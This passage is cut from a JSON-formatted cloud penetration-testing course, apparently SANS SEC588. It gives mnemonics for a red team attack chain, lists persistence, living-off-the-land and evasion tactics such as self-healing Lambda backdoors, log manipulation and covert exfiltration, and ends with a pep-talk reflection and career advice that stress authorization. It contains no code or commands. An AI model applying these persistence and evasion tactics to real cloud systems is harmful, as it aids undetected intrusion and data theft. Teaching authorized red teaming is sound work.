        "text": "## Memory Hooks: Complete Red Team Attack Chain\n\n### The \"REPLICATES\" Framework\n\nRemember the complete red team operation with **REPLICATES**:\n\n**R = Reconnaissance** üîç\n- Research target externally\n- Find cloud resources, employees, technologies\n- Remember: \"Recon reveals the roadmap\"\n\n**E = Entry (Initial Access)** üö™\n- Phishing, credential stuffing, exposed services\n- Remember: \"Entry is just the beginning\"\n\n**P = Privilege Escalation** ‚¨ÜÔ∏è\n- IAM misconfigurations, token theft, vulnerable services\n- Remember: \"Privilege unlocks possibilities\"\n\n**L = Lateral Movement** ‚ÜîÔ∏è\n- AWS ‚Üí Azure ‚Üí GCP ‚Üí Kubernetes\n- Remember: \"Laterally spreading like fire\"\n\n**I = Intelligence Gathering** üïµÔ∏è\n- Enumerate all resources, credentials, secrets\n- Remember: \"Information is ammunition\"\n\n**C = Command & Control** üì°\n- Serverless C2, domain fronting, covert channels\n- Remember: \"Control without detection\"\n\n**A = Access Persistence** üîÑ\n- Self-healing backdoors, multiple access methods\n- Remember: \"Always have a backup\"\n\n**T = Threat Emulation** üé≠\n- Mimic real APT tactics\n- Remember: \"Think like the adversary\"\n\n**E = Exfiltration** üíæ\n- Slow data theft, covert channels\n- Remember: \"Extract without triggering alarms\"\n\n**S = Stealth & Evasion** üëª\n- Living off the land, log manipulation\n- Remember: \"Silent is successful\"\n\n---\n\n### The \"5 Ps of Persistence\" üîÑ\n\nRemember persistence mechanisms with the **5 Ps**:\n\n1. **Predictable** = Scheduled (CloudWatch Events, cron)\n2. **Privileged** = Admin access (IAM users with admin policies)\n3. **Protected** = Hard to find (obfuscated names, legitimate-looking)\n4. **Persistent** = Self-healing (Lambda recreates if deleted)\n5. **Pervasive** = Multiple locations (AWS + Azure + K8s)\n\n---\n\n### Attack Chain Cheat Sheet\n\n```\nüìß PHISH ‚Üí üîë CREDS ‚Üí üîç ENUM ‚Üí ‚¨ÜÔ∏è ESCALATE ‚Üí üîÑ PERSIST ‚Üí ‚ÜîÔ∏è LATERAL ‚Üí üíæ EXFIL ‚Üí üßπ CLEAN\n```\n\n**Memory aid**: \"**P**lease **C**ome **E**arly **E**very **P**ossible **L**ate **E**vening **C**lean\"\n\n---\n\n### Living Off the Land (LOTL) Tools\n\nRemember legitimate tools attackers abuse:\n\n**AWS** = **A**lways **W**orking **S**tealthily\n- aws-cli, CloudFormation, Lambda\n\n**Azure** = **A**ttackers **Z**ealously **U**se **R**esources **E**verywhere\n- az-cli, Azure Functions, Logic Apps\n\n**GCP** = **G**reat for **C**overt **P**ersistence\n- gcloud, Cloud Functions, Cloud Run\n\n**K8s** = **K**eep **8** **S**ecret backdoors\n- kubectl, DaemonSets, CronJobs\n\n---\n\n### Evasion \"Don'ts\"\n\nWhat NOT to do (gets you caught):\n\n‚ùå **D**eploy custom malware\n‚ùå **O**bvious external connections\n‚ùå **N**oisy scanning\n‚ùå **'T**raditional C2 beaconing\n\nRemember: **\"DON'T\"** get detected!\n\n### SEC588 Complete Journey Map\n\n```\nüó∫Ô∏è YOUR CLOUD RED TEAM JOURNEY:\n\nWeek 1: Learn methodology (#1165-1166)\n   ‚Üì\nWeek 2: Attack identity (#1167-1168)\n   ‚Üì\nWeek 3: Exploit compute (#1169-1170)\n   ‚Üì\nWeek 4: Break CI/CD & containers (#1171-1172)\n   ‚Üì\nWeek 5: Conquer Kubernetes (#1173)\n   ‚Üì\nWeek 6: Master red team ops (#1174) ‚Üê YOU ARE HERE!\n```\n\nYou've mastered the complete cloud attack lifecycle! üéì"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Final Reflection: Your Cloud Red Team Mastery\n\nCongratulations! You've completed the entire SEC588 Cloud Penetration Testing series. Take a moment to reflect on your incredible journey.\n\n### What You've Accomplished (All 10 Lessons)\n\n‚úÖ **Lesson #1165**: Cloud Pentesting Methodology\n‚úÖ **Lesson #1166**: External Cloud Attack Surface Discovery  \n‚úÖ **Lesson #1167**: Attacking Microsoft Entra ID\n‚úÖ **Lesson #1168**: AWS IAM Privilege Escalation\n‚úÖ **Lesson #1169**: Azure Compute Exploitation\n‚úÖ **Lesson #1170**: Attacking Cloud-Native Applications\n‚úÖ **Lesson #1171**: CI/CD Pipeline Attacks\n‚úÖ **Lesson #1172**: Container Breakout Techniques\n‚úÖ **Lesson #1173**: Kubernetes Penetration Testing\n‚úÖ **Lesson #1174**: Red Team Operations in Cloud\n\n**You now have elite-level cloud security skills.**\n\n### Self-Assessment\n\n**Rate your confidence (1-10) in each area:**\n\n‚ñ° Cloud pentesting methodology: ___/10\n‚ñ° Entra ID / AWS IAM attacks: ___/10\n‚ñ° Compute exploitation (VMs, serverless): ___/10\n‚ñ° CI/CD pipeline compromise: ___/10\n‚ñ° Container/Kubernetes attacks: ___/10\n‚ñ° Complete red team operations: ___/10\n\n**If any score < 7**: Review that lesson and practice in lab environments.\n\n### Your Capability Matrix\n\nYou can now:\n\n**Technical Skills:**\n- ‚úÖ Exploit OAuth/OIDC flows\n- ‚úÖ Escalate privileges in AWS/Azure/GCP\n- ‚úÖ Break out of containers\n- ‚úÖ Compromise Kubernetes clusters\n- ‚úÖ Poison CI/CD pipelines\n- ‚úÖ Establish persistent cloud access\n- ‚úÖ Perform covert data exfiltration\n- ‚úÖ Chain multiple techniques into devastating attack paths\n\n**Strategic Skills:**\n- ‚úÖ Plan multi-stage red team operations\n- ‚úÖ Maintain operational security\n- ‚úÖ Evade cloud security tools\n- ‚úÖ Think like APT adversaries\n- ‚úÖ Adapt tactics when detected\n\n**You're now in the top 1% of cloud security professionals.**\n\n### Real-World Application\n\n**This week, commit to:**\n\n1. Set up a cloud lab environment (AWS free tier, Azure trial, or GKE)\n2. Practice one technique from each lesson\n3. Document your findings\n4. Share knowledge with your team\n\n**This month, commit to:**\n\n1. Execute a complete red team operation in your lab\n2. Write a blog post about one technique\n3. Contribute to an open-source security tool\n4. Apply for a position requiring cloud security skills\n\n**This year, commit to:**\n\n1. Earn a cloud security certification (CCSP, CCSK, AWS Security)\n2. Speak at a security conference or local meetup\n3. Conduct a real red team engagement (authorized!)\n4. Mentor others learning cloud security\n\n### The Impact You Can Make\n\n**With these skills, you can:**\n\nüíº **Secure organizations**: Find vulnerabilities before attackers do\n\nüéì **Educate others**: Teach cloud security to your team\n\nüî¨ **Research**: Discover new attack techniques and CVEs\n\nüèÜ **Compete**: Excel in CTFs and bug bounty programs\n\nüí∞ **Earn**: Command premium salaries ($150k-$300k+)\n\n### Your Next Steps\n\n**Continue Learning:**\n- Stay current with cloud security blogs (AWS Security Blog, Azure Security, etc.)\n- Follow security researchers on Twitter\n- Join cloud security communities (OWASP Cloud Security, CIS)\n- Practice on platforms like HackTheBox, TryHackMe cloud labs\n\n**Get Certified:**\n- AWS Certified Security ‚Äì Specialty\n- Microsoft Certified: Azure Security Engineer\n- Google Cloud Professional Cloud Security Engineer\n- Certified Cloud Security Professional (CCSP)\n\n**Build Your Portfolio:**\n- Create GitHub repos with security tools\n- Write technical blog posts\n- Record video tutorials\n- Contribute to open-source security projects\n\n**Network:**\n- Attend cloud security conferences (RSA, Black Hat, DEF CON)\n- Join local security meetups\n- Connect with professionals on LinkedIn\n- Participate in online communities (Reddit r/netsec, Discord servers)\n\n### Final Challenge\n\n**I challenge you to:**\n\n‚ñ° Complete a full red team operation in your lab within 30 days\n‚ñ° Document the operation as a case study\n‚ñ° Share your findings (blog, presentation, or report)\n‚ñ° Help one other person learn cloud security\n\n### Words of Wisdom\n\n**From a seasoned red teamer:**\n\n> \"The difference between good and great isn't talent‚Äîit's persistence. Keep practicing, keep learning, and never stop challenging yourself. Every failed attack teaches you more than a successful one. Every detection makes you more stealthy. Every lesson makes you more dangerous (in the right hands).\"\n\n**Remember:**\n- üéØ **Always get authorization** before testing systems\n- üõ°Ô∏è **Use these skills ethically** to improve security\n- üìö **Never stop learning** - cloud platforms evolve constantly  \n- ü§ù **Share knowledge** - the security community thrives on collaboration\n- üí™ **Practice relentlessly** - expertise comes from repetition\n\n### You've Completed SEC588! üéì\n\n**What started as curiosity has become mastery.**\n\nYou began learning how clouds work.\n\nYou progressed to attacking cloud services.\n\nYou mastered advanced exploitation techniques.\n\nYou finished by executing complete red team operations.\n\n**You're no longer a student‚Äîyou're a cloud security expert.**\n\n### One Last Thing...\n\nWhen you land your dream job, secure a critical system, or discover a significant vulnerability‚Äîremember this moment. Remember that you invested time to learn these skills. Remember that knowledge without ethics is dangerous, but knowledge with purpose is powerful.\n\n**Go forth and secure the cloud.** üöÄ\n\n**The cloud needs defenders like you.**\n\nThank you for completing this journey. I'm proud of you.\n\nNow go apply what you've learned! üí™üîí‚òÅÔ∏è"
      }
    }
  ],
  "tags": [
    "Course: SANS-SEC588",
    "Career Path: Cloud Security",
    "Career Path: Red Teamer",
    "Career Path: Pentester"
  ]
}
